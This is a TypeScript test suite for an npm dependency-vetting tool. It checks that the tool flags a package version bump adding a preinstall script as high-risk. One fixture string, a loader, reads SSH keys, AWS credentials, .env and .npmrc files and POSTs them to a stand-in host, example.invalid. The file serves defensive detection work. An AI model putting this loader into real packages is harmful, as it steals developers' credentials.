/**
 * Gap A (ledger P-158): content-based update vetting.
 *
 * depguard 0.1.0 verdicted CLEAR on name vetting of the compromised
 * legitimate package tensorlake 0.5.144, because a name carries no
 * signal. The fix fetches both versions' tarballs in content mode and
 * diffs the install-time surface statically (nothing is installed or
 * executed). These tests inject fixture packuments and in-memory
 * tarballs, so no test touches the network.
 *
 * Fixture 1 is the tensorlake shape: version N benign with no install
 * script, version N+1 adding a preinstall that loads a file carrying
 * credential-path strings and a network endpoint (inert strings,
 * example.invalid). On 0.1.0 code these tests fail: that is the red.
 * Controls: a normal feature bump and a benign node-gyp style
 * postinstall must not grade high.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { gzipSync } from "node:zlib";
import { join } from "node:path";
import { guardPath, checkPackage } from "../src/core.js";
import { makeDir, writePkg, writeLock, lockEntry, mkdirp } from "./helpers.js";

// ------------------------------------------------------------ tar writer

function tarHeader(name: string, size: number): Buffer {
  const h = Buffer.alloc(512, 0);
  h.write(name.slice(0, 100), 0, "utf8");
  h.write("0000644\0", 100, "ascii");
  h.write("0000000\0", 108, "ascii");
  h.write("0000000\0", 116, "ascii");
  h.write(size.toString(8).padStart(11, "0") + "\0", 124, "ascii");
  h.write("00000000000\0", 136, "ascii");
  h.write("        ", 148, "ascii");
  h.write("0", 156, "ascii");
  h.write("ustar\0", 257, "ascii");
  h.write("00", 263, "ascii");
  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148, "ascii");
  return h;
}

/** Build an npm-shaped tarball (gzip of a ustar archive rooted at package/). */
export function makeTarball(files: Record<string, string>): Buffer {
  const chunks: Buffer[] = [];
  for (const [path, text] of Object.entries(files)) {
    const data = Buffer.from(text, "utf8");
    chunks.push(tarHeader(`package/${path}`, data.length));
    chunks.push(data);
    const pad = (512 - (data.length % 512)) % 512;
    if (pad > 0) chunks.push(Buffer.alloc(pad, 0));
  }
  chunks.push(Buffer.alloc(1024, 0));
  return gzipSync(Buffer.concat(chunks));
}

// ------------------------------------------------------- fixture fetcher

interface FixtureVersion { files: Record<string, string>; scripts?: Record<string, string> }

function fixtureFetcher(packages: Record<string, Record<string, FixtureVersion>>): {
  contentFetch: { packument: (name: string) => Promise<unknown>; tarball: (url: string) => Promise<Buffer> };
  calls: { packument: number; tarball: number };
} {
  const calls = { packument: 0, tarball: 0 };
  const tarballs = new Map<string, Buffer>();
  const packuments: Record<string, unknown> = {};
  for (const [name, versions] of Object.entries(packages)) {
    const vs: Record<string, unknown> = {};
    const time: Record<string, string> = {};
    let day = 1;
    for (const [version, fv] of Object.entries(versions)) {
      const url = `https://registry.invalid/${name}/-/${name}-${version}.tgz`;
      const pkgJson: Record<string, unknown> = { name, version };
      if (fv.scripts) pkgJson.scripts = fv.scripts;
      tarballs.set(url, makeTarball({ "package.json": JSON.stringify(pkgJson), ...fv.files }));
      vs[version] = { scripts: fv.scripts ?? {}, dist: { tarball: url } };
      time[version] = `2026-01-${String(day++).padStart(2, "0")}T00:00:00.000Z`;
    }
    packuments[name] = { versions: vs, time, "dist-tags": { latest: Object.keys(versions).at(-1) } };
  }
  return {
    calls,
    contentFetch: {
      packument: async (name: string) => { calls.packument++; return packuments[name] ?? null; },
      tarball: async (url: string) => {
        calls.tarball++;
        const b = tarballs.get(url);
        if (!b) throw new Error(`no fixture tarball for ${url}`);
        return b;
      },
    },
  };
}

const BENIGN_INDEX = "module.exports = { hello: () => 'hello' };\n";
const SETUP_LOADER = [
  "// inert fixture loader: strings only, never executed by the tests",
  "import { readFileSync } from 'node:fs';",
  "const paths = ['~/.ssh/id_rsa', '~/.aws/credentials', './.env', '~/.npmrc'];",
  "const data = paths.map((p) => { try { return readFileSync(p, 'utf8'); } catch { return ''; } });",
  "await fetch('https://example.invalid/collect', { method: 'POST', body: JSON.stringify(data) });",
  "",
].join("\n");

const TENSORLAKE_LIKE: Record<string, Record<string, FixtureVersion>> = {
  "tensorlake-like": {
    "1.0.0": { files: { "index.js": BENIGN_INDEX } },
    "1.0.1": {
      files: { "index.js": BENIGN_INDEX, "lib/setup.mjs": SETUP_LOADER },
      scripts: { preinstall: "node lib/setup.mjs" },
    },
  },
};

describe("content mode (Gap A, P-158)", () => {
  it("grades a bump that adds a credential-harvesting preinstall as HIGH-RISK and names the added signals", async () => {
    const { contentFetch } = fixtureFetcher(TENSORLAKE_LIKE);
    const r = await checkPackage("tensorlake-like", "1.0.1", { content: true, contentFetch } as never);
    assert.equal(r.verdict, "HIGH-RISK", JSON.stringify(r.findings));
    const added = r.findings.find((f) => f.rule === "CONTENT-INSTALL-SCRIPT-ADDED");
    assert.ok(added, JSON.stringify(r.findings));
    assert.equal(added.severity, "high");
    assert.ok(added.evidence.includes("preinstall"), added.evidence);
    assert.ok(added.evidence.includes("node lib/setup.mjs"), added.evidence);
    const cred = r.findings.find((f) => f.rule === "CONTENT-CRED-SIGNAL-ADDED");
    assert.ok(cred, JSON.stringify(r.findings));
    assert.equal(cred.severity, "high");
    assert.ok(cred.evidence.includes(".ssh"), cred.evidence);
    assert.ok(cred.evidence.includes(".aws"), cred.evidence);
    const net = r.findings.find((f) => f.rule === "CONTENT-NETWORK-ENDPOINT-ADDED");
    assert.ok(net, JSON.stringify(r.findings));
    assert.ok(net.evidence.includes("example.invalid"), net.evidence);
  });

  it("guard_path diff mode grades the same bump HIGH-RISK on the changed dependency", async () => {
    const { contentFetch } = fixtureFetcher(TENSORLAKE_LIKE);
    const root = makeDir("depguard-content-");
    const base = join(root, "base"); const current = join(root, "current");
    mkdirp(base); mkdirp(current);
    writePkg(base, { name: "fx", dependencies: { "tensorlake-like": "1.0.0" } });
    writeLock(base, { "tensorlake-like": lockEntry("1.0.0") });
    writePkg(current, { name: "fx", dependencies: { "tensorlake-like": "1.0.1" } });
    writeLock(current, { "tensorlake-like": lockEntry("1.0.1") });
    const r = await guardPath(current, { basePath: base, content: true, contentFetch } as never);
    assert.equal(r.verdict, "HIGH-RISK", JSON.stringify(r.changes));
    const change = r.changes.find((c) => c.name === "tensorlake-like");
    assert.ok(change);
    assert.equal(change.verdict, "HIGH-RISK");
    assert.ok(change.findings.some((f) => f.rule === "CONTENT-INSTALL-SCRIPT-ADDED" && f.severity === "high"));
    assert.ok(change.findings.some((f) => f.rule === "CONTENT-CRED-SIGNAL-ADDED"));
  });

  it("control: a normal feature-release bump with no install script produces no content findings", async () => {
    const { contentFetch } = fixtureFetcher({
      featurelib: {
        "1.0.0": { files: { "index.js": BENIGN_INDEX } },
        "1.1.0": { files: { "index.js": BENIGN_INDEX, "extra.js": "module.exports = 42;\n", "README.md": "# featurelib\n" } },
      },
    });
    const r = await checkPackage("featurelib", "1.1.0", { content: true, contentFetch } as never);
    assert.equal(r.verdict, "CLEAR", JSON.stringify(r.findings));
    assert.ok(!r.findings.some((f) => f.rule.startsWith("CONTENT-")), JSON.stringify(r.findings));
  });

  it("control: a bump adding a benign node-gyp build postinstall does not grade high", async () => {
    const { contentFetch } = fixtureFetcher({
      nativelib: {
        "1.0.0": { files: { "index.js": BENIGN_INDEX } },
        "1.0.1": {
          files: { "index.js": BENIGN_INDEX, "binding.gyp": "{ 'targets': [] }\n" },
          scripts: { postinstall: "node-gyp rebuild" },
        },
      },
    });
    const r = await checkPackage("nativelib", "1.0.1", { content: true, contentFetch } as never);
    assert.notEqual(r.verdict, "HIGH-RISK", JSON.stringify(r.findings));
    assert.ok(!r.findings.some((f) => f.severity === "high" && f.rule.startsWith("CONTENT-")), JSON.stringify(r.findings));
  });

  it("content signals added to an existing install script target grade high even with no new script", async () => {
    const { contentFetch } = fixtureFetcher({
      quietlib: {
        "2.0.0": { files: { "index.js": BENIGN_INDEX, "install.js": "console.log('install');\n" }, scripts: { postinstall: "node install.js" } },
        "2.0.1": { files: { "index.js": BENIGN_INDEX, "install.js": SETUP_LOADER }, scripts: { postinstall: "node install.js" } },
      },
    });
    const r = await checkPackage("quietlib", "2.0.1", { content: true, contentFetch } as never);
    assert.equal(r.verdict, "HIGH-RISK", JSON.stringify(r.findings));
    assert.ok(r.findings.some((f) => f.rule === "CONTENT-CRED-SIGNAL-ADDED" && f.severity === "high"));
  });

  it("without the content flag no tarball or packument fetch happens through the content layer", async () => {
    const { contentFetch, calls } = fixtureFetcher(TENSORLAKE_LIKE);
    const r = await checkPackage("tensorlake-like", "1.0.1", { contentFetch } as never);
    assert.equal(calls.packument, 0);
    assert.equal(calls.tarball, 0);
    assert.equal(r.verdict, "CLEAR");
  });
});
